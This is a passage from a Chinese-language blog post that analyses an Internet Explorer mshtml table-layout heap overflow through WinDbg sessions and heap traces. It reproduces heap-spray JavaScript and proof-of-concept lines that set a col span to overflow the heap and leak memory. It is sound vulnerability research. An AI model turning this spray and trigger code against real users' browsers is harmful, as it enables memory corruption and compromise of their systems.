<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">67545b83</span> 8b75dc          mov     esi,dword ptr [ebp-24h]</span><br><span class="line"><span class="number">67545b86</span> ff75f4          <span class="built_in">push</span>    dword ptr [ebp-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">67545b89</span> e8c4951800      call    mshtml!CTableColCalc::AdjustForCol (676cf152)</span><br></pre></td></tr></table></figure>

<p>第一次传入的esi是没什么问题的，看到+0x18也是没问题的</p>
<p><img src="http://pic.giantbranch.cn/1503585304863.jpg" alt></p>
<p>从调试结果看esi每次递增0x1c，而且第一次的时候不会递增</p>
<p><img src="http://pic.giantbranch.cn/1503585874610.jpg" alt></p>
<p>ida看到，这确实好似每次都会递增0x1c，即10进制的28</p>
<p><img src="http://pic.giantbranch.cn/1503586156367.jpg" alt></p>
<p>而控制循环次数的就是在这一句</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v154 &gt;= v161 )</span><br><span class="line">               <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>因为v154在循环外初始化为0，所以核心应该是v161</p>
<p>我们向上寻找161的来源，是CTableCell::GetAAcolSpan或者上面那个，看名字就猜到是获取clo的span值的，而且最大是1000，我们看看调试是哪个，</p>
<p><img src="http://pic.giantbranch.cn/1503586515170.jpg" alt></p>
<p>调试发现是调用GetAAspan（第一处），返回值为1，跟poc符合</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">69430000</span> 694e2000   C:\Windows\System32\jscript.dll</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=04f1bfd0 <span class="built_in">ebx</span>=088d5ea8 <span class="built_in">ecx</span>=<span class="number">00000033</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=086ecfac <span class="built_in">edi</span>=04f1bfd0</span><br><span class="line"><span class="built_in">eip</span>=66f45a2e <span class="built_in">esp</span>=0458e228 <span class="built_in">ebp</span>=0458e2c4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x37e</span>:</span><br><span class="line">66f45a2e e8d445dfff      <span class="keyword">call</span>    mshtml!CTableCol::GetAAspan (66d3a007)</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=088d5ea8 <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=07e4bff0 <span class="built_in">esi</span>=086ecfac <span class="built_in">edi</span>=04f1bfd0</span><br><span class="line"><span class="built_in">eip</span>=66f45a33 <span class="built_in">esp</span>=0458e228 <span class="built_in">ebp</span>=0458e2c4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x383</span>:</span><br><span class="line">66f45a33 3de8030000      <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">3E8h</span></span><br></pre></td></tr></table></figure>

<p>第二次就返回0x38e，即1000，就是poc中将span修改为1000</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=04f1bfd0 <span class="built_in">ebx</span>=088d5ea8 <span class="built_in">ecx</span>=<span class="number">00000033</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=086ecfac <span class="built_in">edi</span>=04f1bfd0</span><br><span class="line"><span class="built_in">eip</span>=66f45a2e <span class="built_in">esp</span>=0458da40 <span class="built_in">ebp</span>=0458dadc iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x37e</span>:</span><br><span class="line">66f45a2e e8d445dfff      <span class="keyword">call</span>    mshtml!CTableCol::GetAAspan (66d3a007)</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=000003e8 <span class="built_in">ebx</span>=088d5ea8 <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=07e4bff0 <span class="built_in">esi</span>=086ecfac <span class="built_in">edi</span>=04f1bfd0</span><br><span class="line"><span class="built_in">eip</span>=66f45a33 <span class="built_in">esp</span>=0458da40 <span class="built_in">ebp</span>=0458dadc iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x383</span>:</span><br><span class="line">66f45a33 3de8030000      <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">3E8h</span></span><br></pre></td></tr></table></figure>

<p>而这个堆块本来分配的时候就只有0x70，我们也可以看到是在 66e78ffb mshtml!CImplAry::EnsureSizeWorker+0x000000a1分配的</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="symbol">:</span><span class="number">005</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">eax=08764f8<span class="number">0</span> ebx=088d5ea8 ecx=<span class="number">00000000</span> edx=<span class="number">00004141</span> esi=086ecf9<span class="number">0</span> edi=<span class="number">00000001</span></span><br><span class="line">eip=<span class="number">66</span>f45b89 esp=<span class="number">045</span>8da34 ebp=<span class="number">045</span>8dadc iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</span><br><span class="line">cs=<span class="number">001</span>b  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003</span>b  gs=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!<span class="symbol">CTableLayout:</span><span class="symbol">:CalculateMinMax+</span><span class="number">0x52a</span><span class="symbol">:</span></span><br><span class="line"><span class="number">66</span>f45b89 e8c495180<span class="number">0</span>      call    mshtml!<span class="symbol">CTableColCalc:</span><span class="symbol">:AdjustForCol</span> (<span class="number">670</span>cf152)</span><br><span class="line"><span class="number">0</span><span class="symbol">:</span><span class="number">005</span>&gt; !heap -p -a esi</span><br><span class="line">    address 086ecf9<span class="number">0</span> found <span class="keyword">in</span></span><br><span class="line">    _DPH_HEAP_ROOT @ <span class="number">1151000</span></span><br><span class="line">    <span class="keyword">in</span> busy allocation (  <span class="symbol">DPH_HEAP_BLOCK:</span>         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 <span class="number">859323</span><span class="symbol">c:</span>          <span class="number">86</span>ecf9<span class="number">0</span>               <span class="number">70</span> -          <span class="number">86</span>ec00<span class="number">0</span>             <span class="number">2000</span></span><br><span class="line">    <span class="number">6</span>e4a8e89 verifier!AVrfDebugPageHeapAllocate+<span class="number">0x00000229</span></span><br><span class="line">    <span class="number">77514</span>ea6 ntdll!RtlDebugAllocateHeap+<span class="number">0x00000030</span></span><br><span class="line">    <span class="number">774</span>d7d96 ntdll!RtlpAllocateHeap+<span class="number">0x000000c4</span></span><br><span class="line">    <span class="number">774</span>a34ca ntdll!RtlAllocateHeap+<span class="number">0x0000023a</span></span><br><span class="line">    <span class="number">66</span>e56c94 mshtml!_HeapRealloc+<span class="number">0x00000036</span></span><br><span class="line">    <span class="number">66</span>e78ffb mshtml!<span class="symbol">CImplAry:</span><span class="symbol">:EnsureSizeWorker+</span><span class="number">0x000000a1</span></span><br><span class="line">    <span class="number">66</span>db02f7 mshtml!<span class="symbol">CTableLayout:</span><span class="symbol">:CalculateMinMax+</span><span class="number">0x000001df</span></span><br><span class="line">    <span class="number">66</span>db0713 mshtml!<span class="symbol">CTableLayout:</span><span class="symbol">:CalculateLayout+</span><span class="number">0x00000276</span></span><br><span class="line">    <span class="number">66</span>d9af19 mshtml!<span class="symbol">CTableLayout:</span><span class="symbol">:CalcSizeVirtual+</span><span class="number">0x00000720</span></span><br><span class="line">    <span class="number">66</span>e8cc48 mshtml!<span class="symbol">CLayout:</span><span class="symbol">:CalcSize+</span><span class="number">0x000002b8</span></span><br><span class="line">    <span class="number">66</span>e7f5d<span class="number">0</span> mshtml!<span class="symbol">CFlowLayout:</span><span class="symbol">:MeasureSite+</span><span class="number">0x00000312</span></span><br><span class="line">    <span class="number">66</span>e7f31d mshtml!<span class="symbol">CFlowLayout:</span><span class="symbol">:GetSiteWidth+</span><span class="number">0x00000156</span></span><br><span class="line">    <span class="number">66</span>e7f664 mshtml!<span class="symbol">CLSMeasurer:</span><span class="symbol">:GetSiteWidth+</span><span class="number">0x000000ce</span></span><br><span class="line">    <span class="number">66</span>e7fb4<span class="number">0</span> mshtml!<span class="symbol">CEmbeddedILSObj:</span><span class="symbol">:Fmt+</span><span class="number">0x00000150</span></span><br><span class="line">    <span class="number">70</span>fb665d msls31!ProcessOneRun+<span class="number">0x000003e9</span></span><br><span class="line">    <span class="number">70</span>fb6399 msls31!FetchAppendEscCore+<span class="number">0x0000018e</span></span><br><span class="line">    <span class="number">70</span>fb6252 msls31!LsDestroyLine+<span class="number">0x0000047f</span></span><br><span class="line">    <span class="number">70</span>fb61c3 msls31!LsDestroyLine+<span class="number">0x000009ff</span></span><br><span class="line">    <span class="number">70</span>fb293f msls31!LsCreateLine+<span class="number">0x000000cb</span></span><br><span class="line">    <span class="number">66</span>e7dd81 mshtml!<span class="symbol">CLSMeasurer:</span><span class="symbol">:LSDoCreateLine+</span><span class="number">0x00000127</span></span><br><span class="line">    <span class="number">66</span>e917cc mshtml!<span class="symbol">CLSMeasurer:</span><span class="symbol">:LSMeasure+</span><span class="number">0x00000034</span></span><br><span class="line">    <span class="number">66</span>e91ef5 mshtml!<span class="symbol">CLSMeasurer:</span><span class="symbol">:Measure+</span><span class="number">0x000001e6</span></span><br><span class="line">    <span class="number">66</span>e91db1 mshtml!<span class="symbol">CLSMeasurer:</span><span class="symbol">:MeasureLine+</span><span class="number">0x0000001c</span></span><br><span class="line">    <span class="number">66</span>e911a2 mshtml!<span class="symbol">CRecalcLinePtr:</span><span class="symbol">:MeasureLine+</span><span class="number">0x0000046d</span></span><br><span class="line">    <span class="number">66</span>e933d9 mshtml!<span class="symbol">CDisplay:</span><span class="symbol">:RecalcLinesWithMeasurer+</span><span class="number">0x00000440</span></span><br><span class="line">    <span class="number">66</span>e930eb mshtml!<span class="symbol">CDisplay:</span><span class="symbol">:RecalcLines+</span><span class="number">0x0000006b</span></span><br><span class="line">    <span class="number">66</span>e93015 mshtml!<span class="symbol">CDisplay:</span><span class="symbol">:RecalcView+</span><span class="number">0x0000006d</span></span><br><span class="line">    <span class="number">66</span>e92fc8 mshtml!<span class="symbol">CFlowLayout:</span><span class="symbol">:CalcTextSize+</span><span class="number">0x0000043d</span></span><br><span class="line">    <span class="number">66</span>d9eb06 mshtml!<span class="symbol">CFlowLayout:</span><span class="symbol">:CalcSizeCoreCompat+</span><span class="number">0x00001045</span></span><br><span class="line">    <span class="number">66</span>e902ee mshtml!<span class="symbol">CFlowLayout:</span><span class="symbol">:CalcSizeCore+</span><span class="number">0x00000049</span></span><br><span class="line">    <span class="number">66</span>e90367 mshtml!<span class="symbol">CBodyLayout:</span><span class="symbol">:CalcSizeCore+</span><span class="number">0x000000d8</span></span><br><span class="line">    <span class="number">66</span>e9029c mshtml!<span class="symbol">CFlowLayout:</span><span class="symbol">:CalcSizeVirtual+</span><span class="number">0x000001af</span></span><br></pre></td></tr></table></figure>

<p>所以整个漏洞其实本来span为1，堆分配了0x70的大小是足够的，但是当执行时间触发器的over_trigger函数时候，将span改写为1000，导致循环次数增大，最终导致越界写到还没分配的地址（因为大小只有0x70啊），触发异常</p>
<p><img src="http://pic.giantbranch.cn/1505701712480.jpg" alt></p>
<p>那么从这里看width暂时没起作用，可能是漏洞利用的时候会用得，将width的赋值删掉也是能触发漏洞的</p>
<h1 id="信息泄露原理分析"><a href="#信息泄露原理分析" class="headerlink" title="信息泄露原理分析"></a>信息泄露原理分析</h1><p>首先是先布局，复制一下代码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        </span></span><br><span class="line"><span class="undefined">var leak_index = -1;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var dap = "EEEE";</span></span><br><span class="line"><span class="xml">while ( dap.length <span class="tag">&lt; <span class="attr">480</span> ) <span class="attr">dap</span> += <span class="string">dap;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var padding = "AAAA";</span></span><br><span class="line"><span class="xml">while ( padding.length <span class="tag">&lt; <span class="attr">480</span> ) <span class="attr">padding</span> += <span class="string">padding;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var filler = "BBBB";</span></span><br><span class="line"><span class="xml">while ( filler.length <span class="tag">&lt; <span class="attr">480</span> ) <span class="attr">filler</span> += <span class="string">filler;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">//spray</span></span><br><span class="line"><span class="undefined">var arr = new Array();</span></span><br><span class="line"><span class="undefined">var rra = new Array();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var div_container = document.getElementById("test");</span></span><br><span class="line"><span class="undefined">div_container.style.cssText = "display:none";</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">for (var i=0; i <span class="tag">&lt; <span class="attr">500</span>; <span class="attr">i</span>+=<span class="string">2)</span> &#123;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    // E</span></span><br><span class="line"><span class="undefined">    rra[i] = dap.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    // S, bstr = A</span></span><br><span class="line"><span class="undefined">    arr[i] = padding.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    // A, bstr = B</span></span><br><span class="line"><span class="undefined">    arr[i+1] = filler.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    // B</span></span><br><span class="line"><span class="undefined">    var obj = document.createElement("button");</span></span><br><span class="line"><span class="undefined">    div_container.appendChild(obj);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">for (var i=200; i<span class="tag">&lt;<span class="name">500;</span> <span class="attr">i</span>+=<span class="string">2</span> ) &#123;</span></span></span><br><span class="line"><span class="undefined">    rra[i] = null;</span></span><br><span class="line"><span class="undefined">    CollectGarbage();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先是搞了3个480长度的字符串，之后声明了两个数组，跟着实际复制0x100大小的复制到数组里面，arr数组其中A和B是连续的，而rra中E是间隔的，之后还新建一个button对象</p>
<p>最后还有个循环将rra置空，，之后回收垃圾，这个相当于free吧</p>
<p>之后便是一堆table，col元素</p>
<p><img src="http://pic.giantbranch.cn/1505705073086.jpg" alt></p>
<p>为了弄清整个过程我们需要看看CollectGarbage回收的内存会不会是我们之后触发漏洞申请的内存，是的话就好办了</p>
<p>我们调试看看，字jscript加载的时候下断点</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; sxe ld:jscript</span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 6c330000 6c3e2000   C:\Windows\System32\jscript.dll</span><br><span class="line"><span class="built_in">eax</span>=0a380000 <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=011a1000 <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=7ffda000 <span class="built_in">edi</span>=0487e1fc</span><br><span class="line"><span class="built_in">eip</span>=775c64f4 <span class="built_in">esp</span>=0487e114 <span class="built_in">ebp</span>=0487e168 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">775c64f4 c3              <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<p>之后对JsCollectGarbage下断点（其实释放内存的函数应该都会调用底层函数ntdll!RtlFreeHeap）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; bp jscript!JsCollectGarbage</span><br></pre></td></tr></table></figure>

<p>根据作者的思路，我们先对RtlFreeHeap下断，从他的定义可以看到第3个参数就是释放的地址（可以从msdn看到）</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOLEAN RtlFreeHeap(</span><br><span class="line">  <span class="variable">_In_</span>     PVOID HeapHandle,</span><br><span class="line">  <span class="variable">_In_opt_</span> ULONG Flags,</span><br><span class="line">  <span class="variable">_In_</span>     PVOID HeapBase</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>先禁用我们的JsCollectGarbage，对RtlFreeHeap下个记录断点（注：echo后面的其实是输出字符串：free heap）</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; <span class="keyword">bl</span></span><br><span class="line"><span class="keyword"> </span><span class="number">0</span> e <span class="number">6</span>c<span class="number">3b</span>8555     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** <span class="keyword">jscript!JsCollectGarbage</span></span><br><span class="line"><span class="keyword">0:005&gt; </span><span class="keyword">bd </span><span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; <span class="keyword">bu </span>ntdll!RtlFreeHeap <span class="string">".echo free heap;db poi(esp+c) l10;g"</span></span><br></pre></td></tr></table></figure>

<p>同时我们也关注漏洞位置分配的内存，我们在下面这行下断点（作者输出的是ebx+0x9c的值,这是之前调试的时候发现的值）</p>
<p><img src="http://pic.giantbranch.cn/1505896787170.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; bu CTableLayout::CalculateMinMax+0x16d &quot;.echo vulheap;dd poi(ebx+9c) l4;g&quot;</span><br></pre></td></tr></table></figure>

<p>由于这个输出太多，我们输出到文件</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; <span class="selector-class">.logopen</span> c:\log.txt</span><br><span class="line">Opened log file <span class="string">'c:\log.txt'</span></span><br></pre></td></tr></table></figure>

<p>我们查找一下vulheap字符串</p>
<p>vulheap<br>03f35e68  0000054b 00450045 00450045 00450045</p>
<p>我们看看我们之前释放的内存有没有03f35e68，查找一下果然有</p>
<p><img src="http://pic.giantbranch.cn/1505961234216.jpg" alt></p>
<p>其实还有很多个这样的，因为毕竟是133个col元素</p>
<p>此外在poc中，将span设置为19，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">obj_col.span = <span class="number">19</span>;</span><br></pre></td></tr></table></figure>

<p>这里作者说得不是很清楚，首先id为132的col元素的span为9</p>
<p>那么一开始分配的内存是<code>9*0x1c=0xfc</code>，这个放到0x100已经释放的内存应该是挺合适的，内存管理器就是要找到合适的内存，道理应该是这样的</p>
<p><img src="http://pic.giantbranch.cn/1505962114658.jpg" alt></p>
<p>我们看看vulheap到底长怎么样（下面是信息泄露完后的情形），需要重点注意的是前面还有后面的一些地方被被覆盖为04 10 00 00 即0x00001004，这个正是<code>width*100</code>的值</p>
<p><img src="http://pic.giantbranch.cn/1505963807949.jpg" alt></p>
<p>而程序的异常复制中复制的源地址是是<code>CTreeNode::GetFancyFormat</code>返回地址指向的值，一次复制一个dword，所以我们看到vulheap还有EE..的残留，而且复制的目标是0x18偏移，每次还再偏移0x1c</p>
<p>我们看看<code>CTreeNode::GetFancyFormat</code>的某次返回值，之后还要+0x70</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:74EC5A4A</span>                 <span class="selector-tag">call</span>    ?<span class="selector-tag">GetFancyFormat</span>@<span class="keyword">CTreeNode</span>@@<span class="keyword">QAEPBVCFancyFormat</span>@@<span class="keyword">XZ</span> ; 某次返回值<span class="selector-pseudo">:0x02a70a20</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:74EC5A4F</span>                 <span class="selector-tag">add</span>     <span class="selector-tag">eax</span>, 70<span class="selector-tag">h</span></span><br></pre></td></tr></table></figure>

<p>我们看一下复制源，是00010049</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; dd <span class="number">0x02a70a20</span>+<span class="number">70</span> l1</span><br><span class="line"><span class="number">02</span>a70a90  <span class="number">00010049</span></span><br></pre></td></tr></table></figure>

<p>那么上面的vulheap应该是00010049而不是1004啊，为什么呢</p>
<p>我下个断点看看</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp mshtml!<span class="symbol">CTableLayout:</span><span class="symbol">:CalculateMinMax+</span><span class="number">0x16d</span> <span class="string">".echo vulheap;dd poi(ebx+9c) l4;ba w4 poi(ebx+9c);g"</span></span><br></pre></td></tr></table></figure>

<p>也是断在AdjustForCol函数，而ebx正是0x1004</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00010048</span> <span class="built_in">ebx</span>=<span class="number">00001004</span> <span class="built_in">ecx</span>=02de8040 <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=02de8028 <span class="built_in">edi</span>=02de8040</span><br><span class="line"><span class="built_in">eip</span>=6600f181 <span class="built_in">esp</span>=02429d5c <span class="built_in">ebp</span>=02429d64 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+<span class="number">0x2f</span>:</span><br><span class="line">6600f181 eb2a            <span class="keyword">jmp</span>     mshtml!CTableColCalc::AdjustForCol+<span class="number">0x5b</span> (6600f1ad)</span><br></pre></td></tr></table></figure>

<p>我们看看上一个地址是什么呢，原来是这两条语句</p>
<p><img src="http://pic.giantbranch.cn/1506041191693.jpg" alt></p>
<p>即下面这个位置啊，这样调试过后就很清楚了</p>
<p><img src="http://pic.giantbranch.cn/1505984286959.jpg" alt></p>
<p>之后我们看看over_trigger函数</p>
